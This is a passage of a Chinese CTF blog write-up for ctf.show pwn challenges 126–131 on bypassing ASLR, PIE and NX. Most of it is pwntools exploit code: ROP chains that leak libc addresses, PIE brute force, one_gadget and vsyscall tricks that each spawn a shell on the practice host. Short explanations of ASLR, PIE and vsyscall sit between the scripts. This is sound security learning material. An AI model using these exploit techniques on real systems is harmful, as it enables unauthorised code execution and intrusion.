elf.got[&#x27;puts&#x27;]</span><br><span class="line">pop_rdi = 0x4007a3 # 0x00000000004007a3 : pop rdi ; ret</span><br><span class="line">ret = 0x4004c6 # 0x00000000004004c6 : ret</span><br><span class="line">payload = cyclic(0x40+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.recvuntil(&quot;Let&#x27;s go\n&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts))</span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts)</span><br><span class="line">libc_base = puts - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">payload = cyclic(0x40+8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Let&#x27;s go\n&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="ASLR知识补充（address-space-layout-randomization）"><a href="#ASLR知识补充（address-space-layout-randomization）" class="headerlink" title="ASLR知识补充（address space layout randomization）"></a>ASLR知识补充（<em>address space layout randomization</em>）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">ASLR（地址空间布局随机化）的配置通常依赖于操作系统。以下是一些常见操作系统中ASLR的配置方法：</span><br><span class="line"></span><br><span class="line">### Linux</span><br><span class="line">在Linux中，ASLR的配置可以通过`/proc/sys/kernel/randomize_va_space`文件进行控制。该文件的值可以设置为以下几种：</span><br><span class="line"></span><br><span class="line">- `0`：禁用ASLR。</span><br><span class="line">- `1`：启用ASLR，随机化堆、栈和共享库。</span><br><span class="line">- `2`：启用ASLR，随机化堆、栈、共享库和内存映射区域。</span><br><span class="line"></span><br><span class="line">要查看当前ASLR设置，可以使用以下命令：</span><br><span class="line">```bash</span><br><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">要更改ASLR设置，可以使用以下命令（需要root权限）：</span><br><span class="line">```bash</span><br><span class="line">echo 2 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">### Windows</span><br><span class="line">在Windows中，ASLR是通过系统设置和应用程序的可执行文件的标志来控制的。可以通过以下步骤启用或禁用ASLR：</span><br><span class="line"></span><br><span class="line">1. 打开“控制面板”。</span><br><span class="line">2. 选择“系统和安全”。</span><br><span class="line">3. 选择“系统”。</span><br><span class="line">4. 点击“高级系统设置”。</span><br><span class="line">5. 在“性能”部分，点击“设置”。</span><br><span class="line">6. 在“数据执行保护”选项卡中，可以找到ASLR的相关设置。</span><br><span class="line"></span><br><span class="line">此外，开发者可以在应用程序的可执行文件中设置ASLR标志，通常通过使用Visual Studio等开发工具。</span><br><span class="line"></span><br><span class="line">### macOS</span><br><span class="line">在macOS中，ASLR是默认启用的，用户通常不需要手动配置。开发者可以通过编译选项来确保他们的应用程序支持ASLR。</span><br><span class="line"></span><br><span class="line">### 总结</span><br><span class="line">ASLR是一种重要的安全机制，通常建议保持其启用状态以增强系统的安全性。如果需要进行配置，请确保了解相关的安全影响。</span><br></pre></td></tr></table></figure>

<h4 id="pwn127"><a href="#pwn127" class="headerlink" title="pwn127"></a>pwn127</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240917204558517.png" alt="image-20240917204558517"></p>
<p>64位程序，relro为partial，开启nx</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn127&#x27;)</span><br><span class="line">#p = process(&#x27;../pwn127&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn127&#x27;,&#x27;b main&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28297)</span><br><span class="line"></span><br><span class="line">main = elf.sym[&#x27;main&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">pop_rdi = 0x400803 </span><br><span class="line">ret = 0x4004fe </span><br><span class="line">payload = cyclic(0x80+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.recvuntil(&#x27;See you again!\n&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts))</span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts)</span><br><span class="line">libc_base = puts - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">payload = cyclic(0x80+8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;See you again!\n&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn128"><a href="#pwn128" class="headerlink" title="pwn128"></a>pwn128</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240917210317971.png" alt="image-20240917210317971"></p>
<p>64位，开启了nx和pie，relro为partial</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240917231021489.png" alt="image-20240917231021489"></p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240917212038775.png" alt="image-20240917212038775"></p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240917231038719.png" alt="image-20240917231038719"></p>
<p>漏洞点在set_pwn的strncpy函数上，由于<code>*(int*)(a1+180)</code>是可控的值，可以由set_user函数输入得到，而且输入的内容s也是可控的，所以就可以达到栈溢出的目的。</p>
<p>解题思路：栈溢出修改返回地址，使其返回GAME_OVER函数。</p>
<p>已知这个函数的地址为0x900，由于pie的特性，在不泄露地址的时候是无法得到pie的基地址的，所以此处只能使用爆破的方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn128&#x27;)</span><br><span class="line">#p = process(&#x27;../pwn128&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn128&#x27;,&#x27;b main&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">	p = remote(&quot;pwn.challenge.ctf.show&quot;,28279)</span><br><span class="line">	payload = b&#x27;a&#x27;*40 + b&#x27;\xca&#x27;</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	</span><br><span class="line">	payload = b&#x27;a&#x27;*200</span><br><span class="line">	payload += b&#x27;\x01\x09&#x27;</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	try:</span><br><span class="line">		p.recv(timeout=1)</span><br><span class="line">	except EOFError:</span><br><span class="line">		p.close()</span><br><span class="line">		continue</span><br><span class="line">	else:</span><br><span class="line">		sleep(0.1)</span><br><span class="line">		p.sendline(&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">		sleep(0.1)</span><br><span class="line">		p.interactive()</span><br><span class="line">		break</span><br></pre></td></tr></table></figure>

<p>这里使用的是\x01\x09而不是\x00\x09是因为使用\x00\x09会导致函数执行失败</p>
<p>这是这篇文章中提及的：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ichunqiu/p/11350476.html">https://www.cnblogs.com/ichunqiu/p/11350476.html</a></p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240918123035366.png" alt="image-20240918123035366"></p>
<p>找到一篇有详细解释的：[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-268715.htm#msg_header_h2_4">原创]新人PWN入坑总结(三)-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p>确实应该考虑strncpy的原因</p>
<h5 id="aslr和pie的区别"><a href="#aslr和pie的区别" class="headerlink" title="aslr和pie的区别"></a>aslr和pie的区别</h5><p>省流一下，pie应该是把代码区的位置给改了，aslr是改了内存的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ASLR（地址空间布局随机化）和PIE（位置无关可执行文件，Position Independent Executable）是两种不同的安全技术，虽然它们都旨在提高程序的安全性，但它们的工作原理和目的有所不同。</span><br><span class="line"></span><br><span class="line">### ASLR（地址空间布局随机化）</span><br><span class="line">- **目的**：ASLR的主要目的是通过随机化程序的内存地址布局来防止攻击者利用已知的内存地址进行攻击。</span><br><span class="line">- **工作原理**：每次程序运行时，操作系统会随机选择堆、栈、共享库和其他内存区域的地址。这意味着攻击者无法预测这些地址，从而降低了利用漏洞的可能性。</span><br><span class="line">- **应用**：ASLR通常在操作系统层面实现，适用于所有运行的程序。</span><br><span class="line"></span><br><span class="line">### PIE（位置无关可执行文件）</span><br><span class="line">- **目的**：PIE的主要目的是使可执行文件本身能够在内存中的任意位置运行，从而与ASLR配合使用，增强安全性。</span><br><span class="line">- **工作原理**：PIE可执行文件在编译时被设计为位置无关，这意味着它们的代码和数据可以在内存中的任何地址运行。这样，结合ASLR，程序的加载地址也是随机的。</span><br><span class="line">- **应用**：PIE通常在编译时通过特定的编译选项（如GCC的`-fPIE`和`-pie`）来启用。</span><br><span class="line"></span><br><span class="line">### 总结</span><br><span class="line">- **ASLR** 是一种内存随机化技术，主要通过随机化内存地址来提高安全性。</span><br><span class="line">- **PIE** 是一种可执行文件格式，使得可执行文件可以在内存中的任意位置运行，通常与ASLR结合使用以增强安全性。</span><br><span class="line"></span><br><span class="line">两者结合使用可以显著提高程序抵御攻击的能力，尤其是缓冲区溢出等攻击。</span><br></pre></td></tr></table></figure>

<h4 id="pwn129"><a href="#pwn129" class="headerlink" title="pwn129"></a>pwn129</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240918124258686.png" alt="image-20240918124258686"></p>
<p>64位程序，relro为partial，除了canary保护全开</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240918130642801.png" alt="image-20240918130642801"></p>
<p>函数名都是手动修改了一下的，首先得泄露出system的地址，所以要先令v7&#x3D;2（实际上试了一下，只能触发下面那个，所以这个函数大概是没什么意义的）</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240918131002742.png" alt="image-20240918131002742"></p>
<p>这里的read明显是一个漏洞点，但是由于没有后门函数，而且开启了pie，所以也很难找到利用点。</p>
<p>建议先看下面那篇知乎的文章再来写这道题，效果会比较好。</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240918174145413.png" alt="image-20240918174145413"></p>
<p>通过溢出点泄露地址，然后根据地址进行特征识别来计算Pie的基址，再使用one_gadget来getshell的方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn129&#x27;)</span><br><span class="line">#p = process(&#x27;../pwn129&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn129&#x27;,&#x27;b main&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28127)</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        py_add = 0</span><br><span class="line">        i += 1</span><br><span class="line">        print(i)</span><br><span class="line">        </span><br><span class="line">        # 连接到远程服务</span><br><span class="line">        p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28127)</span><br><span class="line">        </span><br><span class="line">        # 发送选择</span><br><span class="line">        p.sendlineafter(b&quot;Choice:\n&quot;, &#x27;1&#x27;)</span><br><span class="line">        p.sendlineafter(b&quot;doubts?\n&quot;, &#x27;1&#x27;)</span><br><span class="line">        p.sendlineafter(b&quot;more?\n&quot;, &#x27;1&#x27;)</span><br><span class="line">        </span><br><span class="line">        # 接收问题</span><br><span class="line">        p.recvuntil(b&quot;Question: &quot;)</span><br><span class="line">        a1 = int(p.recvuntil(&quot; &quot;)[:-1])</span><br><span class="line">        p.recvuntil(b&quot;* &quot;)</span><br><span class="line">        a2 = int(p.recvuntil(&quot; &quot;)[:-1])</span><br><span class="line">        </span><br><span class="line">        # 计算答案</span><br><span class="line">        a3 = bytes(str(a1 * a2),&#x27;utf-8&#x27;)</span><br><span class="line">        a4 = a3.ljust(0x30, b&#x27;\x00&#x27;) + b&#x27;\x6c&#x27;</span><br><span class="line">        p.sendafter(b&quot;Answer:&quot;, a4)</span><br><span class="line">        </span><br><span class="line">        # 接收答案</span><br><span class="line">        p.recvuntil(b&quot;doubt &quot;)</span><br><span class="line">        answer = int(p.recvuntil(&quot;\n&quot;)[:-1])</span><br><span class="line">        </span><br><span class="line">        if answer &lt; 0:</span><br><span class="line">            answer = answer + 0x100000000  # 由于answer这个数的⼆进制最⾼位有可能是0或1，所以可能位有符号数（0），要处理，加上一个0x100000000之后就可以转为一个无符号位数</span><br><span class="line">        answer_end = answer + 0x7f2a00000000  # 通过ELF(libc⽂件).symbols[&#x27;函数名&#x27;]查找地址，这里没有原来的libc库，所以是照抄的</span><br><span class="line">        # 根据地址的最后两个十六进制数字计算偏移，其实就是根据地址的特征进行匹配</span><br><span class="line">        if hex(answer_end)[-2:] == &#x27;6f&#x27;:     # _IO_file_write+8F e0+8f=16f</span><br><span class="line">            py_add = answer_end - 0xf88e0 - 0x8f</span><br><span class="line">        elif hex(answer_end)[-2:] == &#x27;00&#x27;:   #_IO_2_1_stdout</span><br><span class="line">            py_add = answer_end - 0x3c2600</span><br><span class="line">        elif hex(answer_end)[-2:] == &#x27;83&#x27;:   #_IO_2_1_stdout_+83 00+83=83</span><br><span class="line">            py_add = answer_end - 0x3c2600 - 0x83</span><br><span class="line">        elif hex(answer_end)[-2:] == &#x27;59&#x27;:   #_IO_do_write+79 e0+79=159</span><br><span class="line">            py_add = answer_end - 0xf88e0 - 0x79</span><br><span class="line">        elif hex(answer_end)[-2:] == &#x27;20&#x27;:    #_IO_file_overflow</span><br><span class="line">            py_add = answer_end - 0x7c820</span><br><span class="line">        elif hex(answer_end)[-2:] == &#x27;8a&#x27;:    #puts+16a 20+6a=8a</span><br><span class="line">            py_add = answer_end - 0x70920 - 0x16a</span><br><span class="line">        </span><br><span class="line">        one_gadget = py_add + 0x45216</span><br><span class="line">        </span><br><span class="line">        if py_add == 0:</span><br><span class="line">            p.close()</span><br><span class="line">            continue</span><br><span class="line">        </span><br><span class="line">        # 发送最终的有效载荷</span><br><span class="line">        p.recvuntil(b&quot;Question: &quot;)</span><br><span class="line">        a1 = int(p.recvuntil(b&quot; &quot;)[:-1])</span><br><span class="line">        p.recvuntil(b&quot;* &quot;)</span><br><span class="line">        a2 = int(p.recvuntil(b&quot; &quot;)[:-1])</span><br><span class="line">        a3 = bytes(str(a1 * a2),&#x27;utf-8&#x27;)</span><br><span class="line">        a4 = a3.ljust(0x38, b&#x27;\x00&#x27;) + p64(one_gadget)</span><br><span class="line">        p.sendafter(b&quot;Answer:&quot;, a4)</span><br><span class="line">        </span><br><span class="line">        # 等待响应</span><br><span class="line">        p.recv(timeout=1)</span><br><span class="line">    </span><br><span class="line">    except EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        p.interactive()</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

<p>没爆破出来，可能是网络波动有点大，不太清楚。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">#io = process(&#x27;./pwn&#x27;)</span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28157)</span><br><span class="line">#libc = ELF(&#x27;/home/bit/libc/64bit/libc-2.23.so&#x27;)</span><br><span class="line">vsyscall_add = 0xffffffffff600000</span><br><span class="line">io.sendlineafter(&quot;Choice:\n&quot;,&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(&quot;Choice:\n&quot;,&#x27;1&#x27;)</span><br><span class="line">io.sendlineafter(&quot;doubts?\n&quot;,&#x27;0&#x27;)</span><br><span class="line">io.sendlineafter(&quot;more?\n&quot;,&#x27;-378&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(99):</span><br><span class="line">	io.recvuntil(&quot;Question: &quot;)</span><br><span class="line">	answer1 = int(io.recvuntil(&quot; &quot;)[:-1])</span><br><span class="line">	io.recvuntil(&quot;* &quot;)</span><br><span class="line">	answer2 = int(io.recvuntil(&quot; &quot;)[:-1])</span><br><span class="line">	io.sendlineafter(&quot;Answer:&quot;,str(answer1*answer2))</span><br><span class="line"></span><br><span class="line">payload = &#x27;A&#x27; * 0x30</span><br><span class="line">payload += &#x27;B&#x27;* 0x8</span><br><span class="line">payload += p64(vsyscall_add) * 3</span><br><span class="line">io.sendafter(&quot;Answer:&quot;,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>下面这个脚本比较靠谱，不用爆破。</p>
<p>这个脚本很nb啊，完全没想过的思路。最重要的一点其实是system函数的地址是存在栈上面的，而RUN选项和SHELL选项所用的栈其实是同一个栈，所以如果先执行了SHELL选项且执行RUN选项代码时第一次输入的值为负数，就会跳过覆盖system函数所在的地址的值，从而重复利用system函数。然后再从溢出点所在的函数触发，溢出到system函数所在的位置（system函数是存在sub_b94()函数接近栈顶的位置，而溢出点是在sub_e43()函数的栈底，只要过了返回地址就接近system函数的位置了）。脚本中还通过执行RUN选项时第二次输入的值将system函数转为了one_gadget所在的地址。而由于不知道ret指令的地址或者nop指令的地址，在脚本中使用vsyscall来实现ret的功能，因为vsyscall的地址是固定的。-378就是system和one_gadget之间的距离，</p>
<p>如下图所示，就算doubts和any more都是输入的0，还是会跳出问题。</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240918220250517.png" alt="image-20240918220250517"></p>
<p>写得非常好的一篇wp：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/78076171">CTF必备技能丨Linux Pwn入门教程——PIE与bypass思路 - 知乎 (zhihu.com)</a></p>
<p>其中就讲到了这道题和上一道题，确实不错。</p>
<h5 id="vsyscall知识补充"><a href="#vsyscall知识补充" class="headerlink" title="vsyscall知识补充"></a>vsyscall知识补充</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">`vsyscall`（Virtual System Call）是 Linux 内核中的一种优化机制，用于加速某些常用的系统调用，例如获取当前时间 (`gettimeofday`) 和进程的 CPU 时间 (`time`)。`vsyscall` 将这些系统调用的入口点暴露在用户空间的固定地址（通常是 `0xffffffffff600000`），因此用户态程序可以直接跳转到这些地址执行相应的系统调用，而不需要经过内核态上下文切换，极大提高了性能。</span><br><span class="line"></span><br><span class="line">### **vsyscall 的作用**</span><br><span class="line">1. **性能优化**：传统的系统调用需要通过中断进入内核态，再执行相应的操作，最后返回用户态。这个过程有一定的性能开销。而 `vsyscall` 允许用户态程序直接执行特定的系统调用，减少了内核上下文切换带来的延迟。</span><br><span class="line">   </span><br><span class="line">2. **固定地址**：`vsyscall` 使用固定的内存地址来存放调用入口。这使得程序可以直接跳转到这些已知的地址，从而避免了频繁的地址计算和上下文切换。</span><br><span class="line"></span><br><span class="line">### **vsyscall 的安全问题**</span><br><span class="line">尽管 `vsyscall` 提升了性能，它也带来了安全隐患。由于这些调用入口是固定地址，攻击者可以利用缓冲区溢出等漏洞，在恶意代码中跳转到这些已知地址，执行系统调用，导致潜在的漏洞利用。</span><br><span class="line"></span><br><span class="line">为了缓解这种风险，Linux 内核逐渐引入了 `vDSO`（Virtual Dynamic Shared Object）作为 `vsyscall` 的替代方案。`vDSO` 提供了类似的功能，但可以使用地址空间布局随机化（ASLR）进行防护，降低被攻击利用的可能性。</span><br><span class="line"></span><br><span class="line">### **vsyscall 和 vDSO 的区别**</span><br><span class="line">- **vsyscall**：使用固定的内存地址，性能高但安全性差，存在利用风险。</span><br><span class="line">- **vDSO**：通过动态链接库实现，与进程的地址空间一起随机化，安全性更高，但性能略低于 `vsyscall`。</span><br><span class="line"></span><br><span class="line">### **现代 Linux 中的 `vsyscall` 状态**</span><br><span class="line">自从引入了 `vDSO` 后，`vsyscall` 的使用逐渐减少，并且在现代 Linux 系统中可能会被禁用或以只读的方式保留，以减少安全风险。如果需要使用 `vsyscall`，可以通过内核参数启用或配置。</span><br><span class="line"></span><br><span class="line">总结来说，`vsyscall` 是一种用于提高特定系统调用性能的机制，但由于安全问题，现代系统更倾向于使用 `vDSO`。</span><br></pre></td></tr></table></figure>

<h4 id="pwn130"><a href="#pwn130" class="headerlink" title="pwn130"></a>pwn130</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240918222338610.png" alt="image-20240918222338610"></p>
<p>64位程序，relro为partial，除了canary保护全开</p>
<p>其实就是上题的plus版本，最多可以进行1000次答题，修改一下循环的次数就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">#io = process(&#x27;./pwn&#x27;)</span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28297)</span><br><span class="line">#libc = ELF(&#x27;/home/bit/libc/64bit/libc-2.23.so&#x27;)</span><br><span class="line">vsyscall_add = 0xffffffffff600000</span><br><span class="line">io.sendlineafter(&quot;Choice:\n&quot;,&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(&quot;Choice:\n&quot;,&#x27;1&#x27;)</span><br><span class="line">io.sendlineafter(&quot;doubts?\n&quot;,&#x27;0&#x27;)</span><br><span class="line">io.sendlineafter(&quot;more?\n&quot;,&#x27;-378&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(999):</span><br><span class="line">	io.recvuntil(&quot;Question: &quot;)</span><br><span class="line">	answer1 = int(io.recvuntil(&quot; &quot;)[:-1])</span><br><span class="line">	io.recvuntil(&quot;* &quot;)</span><br><span class="line">	answer2 = int(io.recvuntil(&quot; &quot;)[:-1])</span><br><span class="line">	io.sendlineafter(&quot;Answer:&quot;,str(answer1*answer2))</span><br><span class="line"></span><br><span class="line">payload = b&#x27;A&#x27; * 0x30</span><br><span class="line">payload += b&#x27;B&#x27;* 0x8</span><br><span class="line">payload += p64(vsyscall_add) * 3</span><br><span class="line">io.sendafter(&quot;Answer:&quot;,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn131"><a href="#pwn131" class="headerlink" title="pwn131"></a>pwn131</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240918232919878.png" alt="image-20240918232919878"></p>
